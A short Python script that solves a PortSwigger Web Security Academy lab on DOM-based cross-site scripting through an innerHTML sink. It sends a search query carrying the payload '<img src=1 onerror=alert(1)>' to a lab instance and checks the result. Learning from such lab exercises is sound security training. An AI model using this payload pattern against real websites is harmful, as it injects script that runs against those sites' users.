#https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

from utils import *
url="https://0a4500cc04bdf4e2815cca3b0082002b.web-security-academy.net/"
payload='?search=<img src=1 onerror=alert(1)>'
url+=payload
response=requests.get(url)
print(check_succes(parse_html(response)))